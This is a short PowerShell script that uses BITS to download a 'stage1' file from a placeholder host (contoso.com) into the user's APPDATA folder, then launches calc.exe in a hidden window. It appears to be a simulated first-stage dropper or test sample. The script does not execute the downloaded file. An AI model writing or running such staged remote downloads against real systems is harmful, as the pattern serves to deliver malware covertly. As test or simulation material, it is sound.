[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://contoso.com:8080/stage1.ps1',
    [string]$DownloadPath = "$env:APPDATA\stage1.bin",
    [int]$RequestTimeout = 147
)
try { Start-BitsTransfer -Source $RemoteUrl -Destination $DownloadPath; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; Write-Verbose "stage marker 31 reached"; Set-Location -Path $env:TEMP } catch { Write-Warning "Remote fetch failed" }
